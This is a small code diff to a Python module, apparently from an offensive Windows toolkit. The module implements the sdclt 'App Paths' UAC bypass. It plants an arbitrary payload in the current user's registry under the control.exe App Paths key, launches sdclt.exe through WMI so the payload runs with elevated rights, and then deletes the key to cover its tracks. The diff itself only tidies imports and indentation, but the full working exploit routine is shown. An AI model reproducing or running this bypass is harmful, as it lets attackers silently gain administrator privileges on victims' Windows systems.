@@ -6,7 +6,6 @@ import os
 import wmi
 import time
 import _winreg
-import win32con
 from core.prints import *
 
 wmi = wmi.WMI()
@@ -30,13 +29,13 @@ def sdclt_control(payload):
 	print_info("Attempting to create registry key")
 	try:
 		key = _winreg.CreateKey(_winreg.HKEY_CURRENT_USER,
-					os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
+								os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
 								
 		_winreg.SetValueEx(key,
-				None,
-				0,
-				_winreg.REG_SZ,
-				payload)
+							None,
+							0,
+							_winreg.REG_SZ,
+							payload)
 		_winreg.CloseKey(key)
 		print_success("Registry key created")
 	except Exception as error:
@@ -49,7 +48,7 @@ def sdclt_control(payload):
 	print_info("Attempting to create process")
 	try:
 		result = wmi.Win32_Process.Create(CommandLine="cmd.exe /c start sdclt.exe",
-						ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=win32con.SW_SHOWNORMAL))
+										ProcessStartupInformation=wmi.Win32_ProcessStartup.new(ShowWindow=1))
 		if (result[1] == 0):
 			print_success("Process started successfully")
 		else:
@@ -64,7 +63,7 @@ def sdclt_control(payload):
 	print_info("Attempting to remove registry key")
 	try:
 		_winreg.DeleteKey(_winreg.HKEY_CURRENT_USER,
-				os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
+						os.path.join("Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe"))
 		print_success("Registry key was deleted")
 	except Exception as error:
 		print_error("Unable to delete key")
